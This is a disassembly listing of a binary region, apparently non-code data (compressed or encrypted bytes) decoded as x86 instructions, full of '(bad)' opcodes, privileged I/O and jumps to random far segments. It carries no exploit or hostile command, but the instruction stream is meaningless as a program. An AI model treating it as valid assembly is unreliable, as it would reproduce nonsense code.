  415f40:	imul   DWORD PTR [esi]
  415f42:	shl    BYTE PTR [esi],0xb
  415f45:	ret    0xc404
  415f48:	(bad)  
  415f4a:	add    eax,0xe2bad1ae
  415f4f:	lods   eax,DWORD PTR ds:[esi]
  415f50:	icebp  
  415f51:	ins    DWORD PTR es:[edi],dx
  415f52:	adc    BYTE PTR [edi+0x568625e8],0xd2
  415f59:	out    0xcc,eax
  415f5b:	sub    ebx,esi
  415f5d:	inc    ebx
  415f5e:	outs   dx,DWORD PTR ds:[esi]
  415f5f:	out    dx,al
  415f60:	mov    ebx,ebp
  415f62:	mov    ch,al
  415f64:	outs   dx,DWORD PTR ds:[esi]
  415f65:	or     esi,edx
  415f67:	inc    edi
  415f68:	mov    cl,0xf0
  415f6a:	jmp    0x415f45
  415f6c:	cmp    eax,DWORD PTR [edi+0x52]
  415f6f:	(bad)  
  415f70:	xor    dh,BYTE PTR [ebx+0x65]
  415f73:	call   0xd0aaac1a
  415f78:	lea    cx,[edi+0x63f2efbc]
  415f7f:	gs ins DWORD PTR es:[edi],dx
  415f81:	pop    ebp
  415f82:	imul   ebx,DWORD PTR [bx-0x6a40],0x41
  415f88:	pop    ebp
  415f89:	out    0x15,eax
  415f8b:	sub    ecx,DWORD PTR ds:[edi+0x4d5cf44e]
  415f92:	mov    ebx,0x11d4f92
  415f97:	xor    DWORD PTR [esi+0x270001ef],edi
  415f9d:	les    edi,FWORD PTR [edx+0x58822623]
  415fa3:	mul    BYTE PTR [edi-0x6ad7241]
  415fa9:	dec    edx
  415faa:	and    BYTE PTR ds:0x4abb763,dh
  415fb0:	pop    ebx
  415fb1:	push   esp
  415fb2:	ret    
  415fb3:	inc    ecx
  415fb4:	dec    esp
  415fb5:	cdq    
  415fb6:	fsub   QWORD PTR [ebx+0x41278ec1]
  415fbc:	mov    esp,0x8f25b6ed
  415fc1:	push   esi
	...
  416032:	add    BYTE PTR [eax],al
  416034:	jnp    0x416038
  416036:	add    ebp,ebx
  416038:	jnp    0x416025
  41603a:	sti    
  41603b:	xchg   edx,eax
  41603c:	rol    al,cl
  41603e:	(bad)  
  41603f:	imul   eax,DWORD PTR [ecx+0x56],0x32
  416043:	aas    
  416044:	adc    al,0xf1
  416046:	add    BYTE PTR [eax],al
  416048:	test   BYTE PTR [eax],0x0
  41604b:	add    dl,dl
  41604d:	ret    0xa414
  416050:	sub    ah,BYTE PTR [ebx+0x3ae8fbcd]
  416056:	pop    ss
  416057:	mov    ebp,0x748b9933
  41605c:	enter  0x997f,0xd0
  416060:	mov    ebp,0x66f0a7c6
  416065:	push   es
  416066:	jnp    0x4160c8
  416068:	retf   
  416069:	rol    DWORD PTR [ecx],1
  41606b:	push   ecx
  41606c:	not    ebp
  41606e:	sbb    BYTE PTR [esp+esi*2],ch
  416071:	mov    eax,0xd9a1f797
  416076:	inc    esp
  416077:	dec    edi
  416078:	sbb    eax,0x6a33b5b0
  41607d:	pop    ebp
  41607e:	(bad)
  416083:	add    al,0x5b
  416085:	popa   
  416086:	inc    ebp
  416087:	jle    0x41604b
  416089:	jne    0x41606c
  41608b:	adc    ebx,edx
  41608d:	ja     0x41605a
  41608f:	jg     0x4160cf
  416091:	lock aas 
  416093:	clc    
  416094:	cdq    
  416095:	fisttp WORD PTR [ebp+0x1f044e34]
  41609b:	enter  0x902e,0x3a
  41609f:	mov    al,0x41
  4160a1:	mov    al,ds:0xba0901a0
  4160a6:	xchg   edx,eax
  4160a7:	stos   BYTE PTR es:[edi],al
  4160a8:	(bad)  
  4160a9:	ja     0x4160f5
  4160ab:	aaa    
  4160ac:	mov    eax,0xdee9e13
  4160b1:	rol    DWORD PTR [edx-0x58],cl
  4160b4:	mov    ebp,0x235d5c36
  4160b9:	and    al,0x5
  4160bb:	cli    
  4160bc:	adc    bl,dh
  4160be:	ins    DWORD PTR es:[edi],dx
  4160bf:	push   es
  4160c0:	inc    edi
  4160c1:	fist   DWORD PTR [edx-0x47]
  4160c4:	pop    ds
  4160c5:	inc    edi
  4160c6:	jmp    0x86dcbea8
  4160cb:	loop   0x41606b
  4160cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160ce:	fld    TBYTE PTR [esi+eax*4]
  4160d1:	jge    0x416089
  4160d3:	fidivr DWORD PTR [ebx+0x109c27d3]
  4160d9:	call   0xa9994ff
  4160de:	xchg   esi,eax
  4160df:	jno    0x416068
  4160e1:	repz inc edi
  4160e3:	test   DWORD PTR [ebp+0x554e72d6],0xbae41ecb
  4160ed:	aam    0x5a
  4160ef:	adc    al,0x2d
  4160f1:	adc    bh,BYTE PTR [eax+edi*8+0x37]
  4160f5:	icebp  
  4160f6:	stos   DWORD PTR es:[edi],eax
  4160f7:	sahf   
  4160f8:	cdq    
  4160f9:	push   esp
  4160fa:	les    edx,FWORD PTR [eax]
  4160fc:	push   ds
  4160fd:	mov    dh,0x9c
  4160ff:	mov    ds:0x3d651051,eax
  416104:	sub    BYTE PTR [ebx+0x44],bh
  416107:	pop    edx
  416108:	rcr    DWORD PTR [edi],0xcf
  41610b:	and    edi,DWORD PTR [edx+0x10cde32c]
  416111:	cdq    
  416112:	hlt    
  416113:	mov    bl,0x39
  416115:	xor    DWORD PTR [esi+eax*2],esi
  416118:	aaa    
  416119:	lods   eax,DWORD PTR ds:[esi]
  41611a:	enter  0xd19a,0x39
  41611e:	stos   BYTE PTR es:[edi],al
  41611f:	ins    DWORD PTR es:[edi],dx
  416120:	call   0x72e40be1
  416125:	rcr    DWORD PTR [edx],cl
  416127:	mov    al,ds:0xd79572ed
  41612c:	jg     0x41611c
  41612e:	retf   
  41612f:	jmp    0x74b1:0x2f8ca1ea
  416136:	arpl   WORD PTR [edi+0x5a2323fe],bx
  41613c:	pop    ecx
  41613d:	jbe    0x4161b2
  41613f:	das    
  416140:	or     bl,BYTE PTR [ecx+0x0]
	...
  4161b3:	add    BYTE PTR [edi+edx*4],ch
  4161b6:	pop    ds
  4161b7:	sar    DWORD PTR [edi-0x8001127],1
  4161bd:	test   al,0xcb
  4161bf:	sub    ebp,DWORD PTR [ebp+ebx*4-0x3b]
  4161c3:	ja     0x4161cf
  4161c5:	repnz add BYTE PTR [eax],al
  4161c8:	test   BYTE PTR [eax],0x0
  4161cb:	add    BYTE PTR [ebp-0x37583c84],ch
  4161d1:	call   0x8b59f446
  4161d6:	inc    ecx
  4161d7:	xor    dh,0xf3
  4161da:	or     al,0x86
  4161dc:	push   ss
  4161dd:	pop    esp
  4161de:	aam    0x57
  4161e0:	aas    
  4161e1:	push   ss
  4161e2:	fs jae 0x416245
  4161e5:	mov    ch,0xcf
  4161e7:	pop    eax
  4161e8:	stos   BYTE PTR es:[edi],al
  4161e9:	mov    ebp,ecx
  4161eb:	nop
  4161ec:	fisub  DWORD PTR [ebx-0x51]
  4161ef:	jl     0x41626f
  4161f1:	inc    esi
  4161f2:	mov    WORD PTR [esi],cs
  4161f4:	or     DWORD PTR [eax],0x1f
  4161f7:	mov    eax,ds:0x9c3f1ba7
  4161fc:	pop    ds
  4161fd:	or     bl,ch
  4161ff:	sub    al,0x52
  416201:	mov    dh,0x19
  416203:	sbb    ah,bh
  416205:	lock retf 
  416207:	pop    esi
  416208:	cmp    DWORD PTR [edi+0x52],esi
  41620b:	pop    esp
  41620c:	add    al,0x42
  41620e:	ins    BYTE PTR es:[edi],dx
  41620f:	leave  
  416210:	pop    esp
  416211:	cld    
  416212:	lods   al,BYTE PTR ds:[esi]
  416213:	inc    edi
  416214:	lea    esi,[ecx+eiz*1+0x73d9cbe5]
  41621b:	adc    eax,0xdaa2a1b0
  416220:	pop    esp
  416221:	sbb    eax,0xc878bab3
  416226:	xchg   edx,eax
  416227:	pop    es
  416228:	gs jns 0x4161b6
  41622b:	loopne 0x4161b3
  41622d:	pop    esp
  41622e:	sbb    eax,0xd45eecb6
  416233:	sahf   
  416234:	add    eax,0x43248377
  416239:	cdq    
  41623a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41623b:	jne    0x41629d
  41623d:	shr    BYTE PTR [esi+0x482f940],cl
  416243:	xor    esp,ebx
  416245:	test   DWORD PTR [edx],ebp
  416247:	inc    esi
  416248:	out    dx,al
  416249:	in     eax,0xa8
  41624b:	aad    0x4f
  41624d:	mov    ah,0x32
  41624f:	imul   eax,esi,0x9832472a
  416255:	repz mov ebp,0xd2744244
  41625b:	ds loop 0x4161e8
  41625e:	leave  
  41625f:	jns    0x4162dc
  416261:	mov    bh,0xad
  416263:	pop    edx
  416264:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416266:	adc    al,dl
  416268:	loopne 0x416211
  41626a:	jecxz  0x41629a
  41626c:	out    dx,eax
  41626d:	fisubr WORD PTR [edx]
  41626f:	sub    eax,0x46f2155c
  416274:	dec    ecx
  416275:	inc    ebx
  416276:	fcomi  st,st(5)
  416278:	cmp    BYTE PTR [eax-0x6f],dl
  41627b:	mov    al,BYTE PTR [ebp-0x16]
  41627e:	fs or  al,0xca
  416281:	cwde   
  416282:	dec    eax
  416283:	mov    ah,0xbc
  416285:	sub    ebx,eax
  416287:	adc    eax,0x76a68545
  41628c:	jg     0x4162ef
  41628e:	adc    al,0xc1
  416290:	les    ebx,FWORD PTR [edi]
  416292:	jg     0x4162d5
  416294:	mov    edi,0x35ad4a76
  416299:	stos   BYTE PTR es:[edi],al
  41629a:	cmp    DWORD PTR [edi],esp
  41629c:	adc    bh,BYTE PTR [esi]
  41629e:	push   0x14
  4162a0:	retf   0xa605
  4162a3:	fistp  QWORD PTR [ebx-0x4e]
  4162a6:	jmp    0x5bea:0x74004e39
  4162ad:	inc    edi
  4162ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162af:	out    dx,al
  4162b0:	pop    ss
  4162b1:	adc    eax,0x60214142
  4162b6:	lock mov bh,0x49
  4162b9:	sub    ebp,esp
  4162bb:	call   0x7fe010dd
  4162c0:	mov    eax,ds:0x9d
	...
  416331:	add    BYTE PTR [eax],al
  416333:	add    BYTE PTR [ebp-0x10],ch
  416336:	repz jmp FWORD PTR cs:[edi]
  41633a:	std    
  41633b:	repz push eax
  41633d:	xchg   ecx,eax
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	ffree  st(5)
  416341:	mov    ds:0xf3007769,al
  416346:	add    BYTE PTR [eax],al
  416348:	test   BYTE PTR [eax],0x0
  41634b:	add    BYTE PTR [ebp+eiz*8-0x37],dl
  41634f:	call   0xb4ef0c8
  416354:	int    0x34
  416356:	mov    ah,0x95
  416358:	pop    ss
  416359:	aaa    
  41635a:	int    0x9
  41635c:	psubw  mm7,mm5
  41635f:	cmc    
  416360:	int    0xeb
  416362:	cdq    
  416363:	nop
  416364:	add    DWORD PTR [edi+0x27],esp
  416367:	aad    0x67
  416369:	and    eax,0x7d21abfe
  41636e:	push   eax
  41636f:	(bad)  
  416370:	mov    ebp,0xbad9fa63
  416375:	sahf   
  416376:	js     0x4163f3
  416378:	pop    edx
  416379:	mov    DWORD PTR [ebp-0x2237f29a],ecx
  41637f:	xlat   BYTE PTR ss:[ebx]
  416381:	mov    esi,0x7a91ef4f
  416386:	sub    BYTE PTR [ebp+0x3f71d7fd],bl
  41638c:	cmp    ax,0x57cc
  416390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416391:	ror    DWORD PTR [ebp-0x58],0x94
  416395:	je     0x416395
  416397:	in     al,dx
  416398:	cmp    DWORD PTR [ecx],0xa8899099
  41639e:	clc    
  41639f:	stos   BYTE PTR es:[edi],al
  4163a0:	cmc    
  4163a1:	retf   0xb0f8
  4163a4:	and    bh,BYTE PTR ds:0x840df655
  4163aa:	arpl   WORD PTR [ecx+ecx*2-0x38],bp
  4163ae:	add    DWORD PTR [esi],ebp
  4163b0:	test   al,0xc8
  4163b2:	aas    
  4163b3:	and    eax,0x9a930ed1
  4163b8:	xchg   dh,dl
  4163ba:	out    0x2b,al
  4163bc:	iret   
  4163bd:	enter  0x9ccc,0x9f
  4163c1:	rol    BYTE PTR [ecx-0x3a],cl
  4163c4:	imul   esp,ebp,0x1a
  4163c7:	pop    ecx
  4163c8:	hlt    
  4163c9:	ftst   
  4163cb:	push   edi
  4163cc:	(bad)  
  4163cd:	pop    esi
  4163ce:	cmc    
  4163cf:	push   esi
  4163d0:	retf   0x7c0c
  4163d3:	in     al,dx
  4163d4:	addr16 cwde 
  4163d6:	sar    DWORD PTR ds:0x95675d81,cl
  4163dc:	mov    ds:0x1822c3c,al
  4163e1:	in     eax,dx
  4163e2:	clc    
  4163e3:	inc    ebx
  4163e4:	rcl    dh,cl
  4163e6:	stc    
  4163e7:	jbe    0x4163de
  4163e9:	dec    eax
  4163ea:	lock rol BYTE PTR [esi-0xa],0xa4
  4163ef:	dec    ebp
  4163f0:	jmp    0x979fc194
  4163f5:	ret    0x8233
  4163f8:	jae    0x416445
  4163fa:	adc    bl,BYTE PTR [eax+0x22]
  4163fd:	(bad)  
  4163ff:	mov    bl,0x5
  416401:	mov    dh,0x8a
  416403:	scas   eax,DWORD PTR es:[edi]
  416404:	(bad)
  416408:	sbb    BYTE PTR [eax+eax*1],ch
  41640b:	push   0xa
  41640d:	mov    DWORD PTR [esi],ecx
  41640f:	ins    BYTE PTR es:[edi],dx
  416410:	dec    esi
  416411:	jbe    0x416465
  416413:	in     al,dx
  416414:	and    al,0xb3
  416416:	xchg   ecx,eax
  416417:	repz jmp 0xded7:0xbe2306df
  41641f:	addr16 add cl,bl
  416422:	and    eax,0xf4a2facc
  416427:	jae    0x4163c1
  416429:	adc    BYTE PTR [ebx],dh
  41642b:	inc    esi
  41642c:	dec    edx
  41642d:	jp     0x416416
  41642f:	sub    BYTE PTR [edx-0x2c1267af],cl
  416435:	jbe    0x416495
  416437:	fwait
  416438:	in     eax,0xb1
  41643a:	push   eax
  41643b:	xor    dl,bl
  41643d:	jl     0x41641b
  41643f:	mov    bh,0x2c
  416441:	or     BYTE PTR [eax],al
	...
  4164b3:	add    ah,ah
  4164b5:	lock sub DWORD PTR [edx],ecx
  4164b8:	cmp    eax,0x4cfee7db
  4164bd:	or     BYTE PTR [ebx-0xa],ah
  4164c0:	and    BYTE PTR [eax-0xc099d0a],0x0
  4164c7:	add    dh,dh
  4164c9:	add    BYTE PTR [eax],al
  4164cb:	add    BYTE PTR [esi+esi*2],ch
  4164ce:	(bad)  
  4164cf:	fiadd  WORD PTR [eax]
  4164d1:	sar    BYTE PTR ds:0x7e5d95b5,1
  4164d7:	cmc    
  4164d8:	(bad)  
  4164d9:	sub    al,0x31
  4164db:	cli    
  4164dc:	mov    edi,0x7a59fbf6
  4164e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164e2:	push   esi
  4164e3:	cs nop
  4164e5:	sub    edi,ebx
  4164e7:	jle    0x4164b6
  4164e9:	ret    
  4164ea:	jo     0x416501
  4164ec:	fcomi  st,st(3)
  4164ee:	scas   al,BYTE PTR es:[edi]
  4164ef:	xor    eax,0xd39e2143
  4164f4:	pop    esp
  4164f5:	dec    eax
  4164f6:	stos   DWORD PTR es:[edi],eax
  4164f7:	jb     0x4164bd
  4164f9:	mov    ds:0x5dd0d1ed,al
  4164fe:	push   ds
  4164ff:	popa   
  416500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416501:	cmc    
  416502:	aaa    
  416503:	jl     0x416533
  416505:	dec    eax
  416506:	add    ecx,eax
  416508:	mov    esp,0x5f6fbb7f
  41650d:	pop    edx
  41650e:	cmp    BYTE PTR [edi-0x20],0x5b
  416512:	sub    al,0x5e
  416514:	jl     0x41653e
  416516:	xchg   edx,eax
  416517:	mov    ecx,0xedc2c516
  41651c:	stos   BYTE PTR es:[edi],al
  41651d:	fistp  WORD PTR [ecx+0x4]
  416520:	add    edi,ebp
  416522:	sbb    edi,0xffffffad
  416525:	lea    edx,[edx]
  416527:	mov    BYTE PTR [ecx+0x1ca0a485],ch
  41652d:	jmp    0x41652e
  41652f:	cs add al,0xe3
  416532:	mov    al,0x5d
  416534:	ss cwde 
  416536:	in     eax,dx
  416537:	ds (bad) 
  416539:	mov    esi,0xc0575955
  41653e:	inc    ecx
  41653f:	xchg   edx,eax
  416540:	sub    DWORD PTR [eax-0xb69f88e],0x3ff5f52a
  41654a:	adc    al,0xc4
  41654c:	fsub   QWORD PTR [eax-0xc5725aa]
  416552:	iret   
  416553:	std    
  416554:	and    DWORD PTR [eax+0x53],esi
  416557:	jbe    0x416511
  416559:	add    ch,al
  41655b:	push   0xffffffb8
  41655d:	sbb    BYTE PTR [esi],0x3b
  416560:	mov    ebx,0x8f8f15f8
  416565:	dec    edx
  416566:	jns    0x4164e8
  416568:	lods   al,BYTE PTR ds:[esi]
  416569:	and    dh,al
  41656b:	cdq    
  41656c:	jecxz  0x416563
  41656e:	inc    eax
  41656f:	push   0x2c448270
  416574:	imul   esp,ecx,0xffffffb2
  416577:	xor    bl,BYTE PTR [eax]
  416579:	int    0xdd
  41657b:	dec    esp
  41657c:	push   esi
  41657d:	cld    
  41657e:	nop
  41657f:	sbb    eax,0x74fd3518
  416584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416585:	jmp    0x4165c6
  416587:	mov    edx,0xc1f29462
  41658c:	inc    eax
  41658d:	mov    ch,0xa8
  41658f:	pop    ebx
  416590:	mov    eax,ds:0x9af5b2d9
  416595:	hlt    
  416596:	aam    0x55
  416598:	add    eax,0xf2ae1599
  41659d:	jmp    0x41658c
  41659f:	mov    esi,0xdc020683
  4165a4:	ficomp WORD PTR [edx]
  4165a6:	add    bh,BYTE PTR [ebx+esi*4+0x3c]
  4165aa:	inc    esp
  4165ab:	cmp    al,0x34
  4165ad:	or     eax,0xb49ebff6
  4165b2:	and    al,0x51
  4165b4:	jnp    0x4165ef
  4165b6:	dec    edi
  4165b7:	fcmovnu st,st(1)
  4165b9:	jbe    0x41657b
  4165bb:	mov    ah,0x70
  4165bd:	xor    al,0xd6
  4165bf:	jne    0x416636
  4165c1:	das    
	...
  416632:	add    BYTE PTR [eax],al
  416634:	ins    DWORD PTR es:[edi],dx
  416635:	call   0xbafd:0x67ff45bc
  41663c:	retf   
  41663d:	sbb    ah,dh
  41663f:	aad    0xf6
  416641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416642:	mov    esi,0xf4ec49
  416647:	add    dh,dh
  416649:	add    BYTE PTR [eax],al
  41664b:	add    BYTE PTR [ebx],ah
  41664d:	mov    eax,ds:0xbdfbebc1
  416652:	xor    al,0x15
  416654:	mov    edi,0x1ca4e190
  416659:	cdq    
  41665a:	push   esp
  41665b:	mov    DWORD PTR [ebx+0x56],ecx
  41665e:	adc    DWORD PTR [esi+0x38],eax
  416661:	push   esi
  416662:	push   ds
  416663:	pop    es
  416664:	pop    ebp
  416665:	(bad)  
  416666:	int3   
  416667:	bound  esi,QWORD PTR [ebp-0x7dd5c711]
  41666d:	in     eax,0x8b
  41666f:	cmc    
  416670:	dec    eax
  416671:	aam    0x97
  416673:	sbb    al,0x49
  416675:	xchg   ecx,eax
  416676:	inc    edi
  416677:	xchg   edx,eax
  416678:	cmp    ecx,esp
  41667a:	cdq    
  41667b:	dec    eax
  41667c:	es or  al,0xe5
  41667f:	icebp  
  416680:	dec    eax
  416681:	xchg   edi,eax
  416682:	vandnpd ymm4,ymm3,YMMWORD PTR [edx-0x8e576a4]
  41668a:	jo     0x4166e2
  41668c:	xchg   BYTE PTR [edi+0x5603cb0],ch
  416692:	xchg   ah,dl
  416694:	lods   al,BYTE PTR ds:[esi]
  416695:	or     al,0xfb
  416697:	(bad)  
  416698:	arpl   WORD PTR [esi+0xeb59398],ax
  41669e:	mov    bl,al
  4166a0:	(bad)  
  4166a1:	jnp    0x4166e3
  4166a3:	mov    eax,0x6cc9344a
  4166a8:	xchg   ecx,eax
  4166a9:	cmp    ch,0x4b
  4166ac:	sub    edi,ebx
  4166ae:	fcomp  st(3)
  4166b0:	push   es
  4166b1:	pop    ss
  4166b2:	sbb    ah,BYTE PTR [edx+eiz*1]
  4166b5:	pop    eax
  4166b6:	call   0x8e1c:0xf952b2fa
  4166bd:	test   DWORD PTR [ecx+0x5b],esp
  4166c0:	mov    cl,0x58
  4166c2:	fdiv   QWORD PTR [esi-0x530c035d]
  4166c8:	mov    esi,ebp
  4166ca:	pop    edx
  4166cb:	sti    
  4166cc:	sub    al,0xdb
  4166ce:	sub    BYTE PTR [esi+0x51620671],cl
  4166d4:	mov    eax,0xa3fef9fb
  4166d9:	ret    0x42bd
  4166dc:	mov    edi,DWORD PTR [ebp-0x79872b03]
  4166e2:	pop    es
  4166e3:	retf   
  4166e4:	data16 xchg BYTE PTR [edi+eax*8+0x214c5eed],bl
  4166ec:	mov    ebp,DWORD PTR [ebp-0x7103feeb]
  4166f2:	cmc    
  4166f3:	pop    dx
  4166f5:	(bad)  
  4166f6:	test   al,0xf6
  4166f8:	js     0x4166d9
  4166fa:	jno    0x416731
  4166fc:	pop    es
  4166fd:	fadd   st,st(4)
  4166ff:	jecxz  0x4166b6
  416701:	shl    ebx,1
  416703:	hlt    
  416704:	pusha  
  416705:	ins    DWORD PTR es:[edi],dx
  416706:	(bad)  
  416707:	pop    edi
  416708:	inc    esi
  416709:	fbld   TBYTE PTR [ecx+esi*8+0x7a]
  41670d:	mov    edx,0x80273094
  416712:	push   ds
  416713:	dec    esp
  416714:	mov    BYTE PTR [ebx],dh
  416716:	scas   eax,DWORD PTR es:[edi]
  416717:	cmp    ebx,DWORD PTR [edx-0x39]
  41671a:	imul   ecx,DWORD PTR [ebp+0x57d462e9],0x10
  416721:	repz gs dec edx
  416724:	mov    eax,0xf28b32d1
  416729:	xor    DWORD PTR ds:0xacc12816,esp
  41672f:	fbstp  TBYTE PTR [eax+0x3e]
  416732:	and    BYTE PTR [edx+0x19],bl
  416735:	jmp    0x4166be
  416737:	adc    ah,dl
  416739:	call   0xc57b:0x2fe7e4ef
  416740:	push   ecx
  416741:	add    eax,0x0
	...
  4167b2:	add    BYTE PTR [eax],al
  4167b4:	retf   
  4167b5:	(bad)  
  4167b6:	xchg   ebx,eax
  4167b7:	in     al,dx
  4167b8:	mov    bh,0xed
  4167ba:	(bad)  
  4167bb:	push   DWORD PTR [ecx+0x19]
  4167be:	comiss xmm6,DWORD PTR [esi+edi*4-0xa1d09ce]
  4167c6:	add    BYTE PTR [eax],al
  4167c8:	test   BYTE PTR [eax],0x0
  4167cb:	add    BYTE PTR [ebx+ebx*4],bl
  4167ce:	fisubr WORD PTR [ebx]
  4167d0:	cmp    dl,BYTE PTR [ebp-0x26cf28d7]
  4167d6:	push   eax
  4167d7:	pop    ebx
  4167d8:	xor    edx,edx
  4167da:	sbb    eax,0x9179707a
  4167df:	xchg   DWORD PTR [ebx+0x5e],edi
  4167e2:	ret    
  4167e3:	(bad)  
  4167e4:	(bad)  [bp+di+0xc]
  4167e8:	cmp    al,0xc9
  4167ea:	loope  0x4167b5
  4167ec:	cmp    al,0x83
  4167ee:	push   esp
  4167ef:	loope  0x416850
  4167f1:	icebp  
  4167f2:	xlat   BYTE PTR ds:[ebx]
  4167f3:	mov    ebp,0x1c729f4e
  4167f8:	inc    ecx
  4167f9:	mov    DWORD PTR [ecx-0xb400ae0],ecx
  4167ff:	cdq    
  416800:	fsubr  QWORD PTR [eax]
  416802:	sbb    eax,esp
  416804:	(bad)  [ecx+ecx*1-0x20]
  416808:	ret    
  416809:	faddp  st(2),st
  41680b:	push   ecx
  41680c:	cdq    
  41680d:	push   ebp
  41680e:	pop    edi
  41680f:	push   0xffffffda
  416811:	(bad)  [esp+eiz*4+0x20]
  416815:	jnp    0x41681a
  416817:	pop    edx
  416818:	mov    DWORD PTR [ecx+ebx*2-0x6318de0],esi
  41681f:	es inc si
  416822:	mov    ds:0x1627083,al
  416827:	bound  edi,QWORD PTR [eax]
  416829:	sub    DWORD PTR [edi+eax*1-0x65],edi
  41682d:	jns    0x416810
  41682f:	shr    DWORD PTR [ebx+0x3c],cl
  416832:	leave  
  416833:	std    
  416834:	(bad)  
  416835:	xor    al,0x9d
  416837:	lock scas al,BYTE PTR es:[edi]
  416839:	es inc edi
  41683b:	jb     0x41685c
  41683d:	add    esi,DWORD PTR [edx]
  41683f:	mov    al,ds:0x65fe9135
  416844:	adc    DWORD PTR [ebx-0x5a],0xe6099b5e
  41684b:	xchg   edi,eax
  41684c:	aam    0x94
  41684e:	inc    edx
  41684f:	popf   
  416850:	sbb    al,0x40
  416852:	fcmovnb st,st(2)
  416854:	test   BYTE PTR [ebp+0x22ed75ff],ch
  41685a:	mov    dl,0x7f
  41685c:	sub    dl,BYTE PTR [edx+ecx*8+0x78]
  416860:	out    0x56,al
  416862:	add    esi,esi
  416864:	pop    esi
  416865:	push   edi
  416866:	cdq    
  416867:	nop
  416868:	(bad)  
  416869:	out    dx,al
  41686a:	je     0x41688c
  41686c:	dec    ebx
  41686d:	push   es
  41686e:	push   cs
  41686f:	outs   dx,BYTE PTR ds:[esi]
  416870:	retf   
  416871:	inc    ebx
  416872:	xchg   edi,esp
  416874:	mov    eax,0x1a65d456
  416879:	mov    esp,0x3bad7ae1
  41687e:	shl    esi,1
  416880:	cwde   
  416881:	ret    
  416882:	cwde   
  416883:	sbb    DWORD PTR [eax+0x3],esi
  416886:	into   
  416887:	pusha  
  416888:	mov    ebx,0x5bafe3dd
  41688d:	arpl   WORD PTR [edi-0x4e8733e],sp
  416893:	mov    ch,0x3a
  416895:	xor    eax,0x1400eebf
  41689a:	clc    
  41689b:	outs   dx,DWORD PTR ds:[esi]
  41689c:	mov    bl,BYTE PTR [esi+0x3e]
  41689f:	add    ch,BYTE PTR [ebx]
  4168a1:	iret   
  4168a2:	inc    esp
  4168a3:	mov    ?,WORD PTR [esi+edi*1+0x6b]
  4168a7:	mov    esi,ds
  4168a9:	test   al,0x6c
  4168ab:	gs cmp bl,BYTE PTR ss:[ebp+0x73118341]
  4168b3:	inc    ebx
  4168b4:	cdq    
  4168b5:	pop    esi
  4168b6:	js     0x416877
  4168b8:	add    ah,BYTE PTR [ecx+0x66]
  4168bb:	fsubr  st,st(3)
  4168bd:	add    al,0x7
  4168bf:	push   ds
  4168c0:	daa    
  4168c1:	xor    BYTE PTR [eax],al
	...
  416933:	add    BYTE PTR [ebp-0x78],al
  416936:	sub    al,0x77
  416938:	in     eax,dx
  416939:	neg    DWORD PTR [edi-0x46]
  41693c:	push   eax
  41693d:	inc    ebp
  41693e:	push   ss
  41693f:	xor    DWORD PTR [edx+edi*8-0x9278a93],ecx
  416946:	add    BYTE PTR [eax],al
  416948:	test   BYTE PTR [eax],0x0
  41694b:	add    BYTE PTR [edx],cl
  41694d:	stos   DWORD PTR es:[edi],eax
  41694e:	sahf   
  41694f:	pop    esi
  416950:	xchg   dl,al
  416952:	push   eax
  416953:	popf   
  416954:	adc    al,0x4c
  416956:	int3   
  416957:	push   esi
  416958:	cmp    eax,0x8f0fab95
  41695d:	mov    eax,ds:0xba80c048
  416962:	push   es
  416963:	cmp    edx,0xbd1a601c
  416969:	ds jo  0x416976
  41696c:	int3   
  41696d:	or     al,al
  41696f:	mov    eax,0x522bee03
  416974:	imul   eax,DWORD PTR [edi+edi*1+0x6c],0xe2099d7
  41697c:	popa   
  41697d:	arpl   WORD PTR [ebp+0x574e7ab4],si
  416983:	out    0xde,eax
  416985:	adc    ebx,edx
  416987:	push   eax
  416988:	cmc    
  416989:	comiss xmm7,DWORD PTR [esi+0x4d]
  41698d:	adc    eax,DWORD PTR [ecx+0x3d0ed070]
  416993:	pop    ebp
  416994:	mov    WORD PTR ds:0xfa740f8e,ds
  41699a:	push   ebp
  41699b:	jl     0x4169bf
  41699d:	outs   dx,DWORD PTR ds:[esi]
  41699e:	xor    BYTE PTR [esi+0x5bb25eb7],bh
  4169a4:	jp     0x4169c6
  4169a6:	fstp   DWORD PTR [ebp-0x5f6c6297]
  4169ac:	and    eax,eax
  4169ae:	xor    al,ah
  4169b0:	out    dx,al
  4169b1:	or     al,0xfb
  4169b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169b4:	ret    0xda7
  4169b7:	push   ss
  4169b8:	fs inc edi
  4169ba:	mov    dh,dl
  4169bc:	out    0x3,al
  4169be:	popa   
  4169bf:	adc    eax,0x834f8b9f
  4169c4:	sar    DWORD PTR [esi+0x5b],0xb3
  4169c8:	push   cs
  4169c9:	inc    edi
  4169ca:	mov    ecx,0x24900661
  4169cf:	int3   
  4169d0:	std    
  4169d1:	scas   al,BYTE PTR es:[edi]
  4169d2:	psubw  mm7,mm2
  4169d5:	imul   ecx,DWORD PTR [ecx+0x69],0x126917e0
  4169dc:	cmc    
  4169dd:	cs and al,0xe9
  4169e0:	aaa    
  4169e1:	inc    esi
  4169e2:	and    al,0xe
  4169e4:	xlat   BYTE PTR ds:[ebx]
  4169e5:	popf   
  4169e6:	leave  
  4169e7:	in     eax,0xa6
  4169e9:	into   
  4169ea:	pop    esp
  4169eb:	xchg   edi,eax
  4169ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169ed:	cmp    esi,DWORD PTR es:[eax+eax*1]
  4169f1:	aas    
  4169f2:	fcmovu st,st(3)
  4169f4:	ins    BYTE PTR es:[edi],dx
  4169f5:	into   
  4169f6:	jne    0x416a3b
  4169f8:	sub    esi,DWORD PTR es:[ebx-0x2e]
  4169fc:	mov    ebp,0x7d1f389d
  416a01:	push   eax
  416a02:	xor    eax,0xe26403bc
  416a07:	stos   BYTE PTR es:[edi],al
  416a08:	scas   al,BYTE PTR es:[edi]
  416a09:	ja     0x416a39
  416a0b:	inc    edx
  416a0c:	out    0x8,al
